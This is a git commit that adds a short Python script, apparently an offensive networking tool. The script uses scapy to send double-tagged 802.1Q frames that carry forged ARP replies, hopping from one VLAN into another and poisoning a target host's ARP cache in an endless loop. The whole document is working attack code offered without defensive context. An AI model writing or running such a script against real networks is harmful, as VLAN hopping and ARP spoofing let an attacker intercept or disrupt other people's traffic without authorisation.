f0f25b026dd52ad0588dc62b4682e7b74dba34eb
exec life <exec_life@protonmail.com>
2022-03-06 10:25:50 -0600

    vlan hop

---
+++ StandardPython/vlan_hop_arp_spoof.py
@@ -0,0 +1,16 @@
+import time
+from scapy.all import sendp, ARP, Ether, Dot1Q
+
+
+iface = ""
+target_ip = "192.168.13.23"
+fake_ip = "192.168.13.5"
+fake_mac = "c0:de:de:ad:be:ef"
+our_vlan = 1
+target_vlan = 2
+
+packet = Ether()/Dot1Q(vlan=our_vlan)/Dot1Q(vlan=target_vlan)/ARP(hwsrc=fake_mac, pdst=target_ip, psrc=fake_ip, op="is-at")
+
+while True:
+    sendp(packet, iface=iface)
+    time.sleep(10)
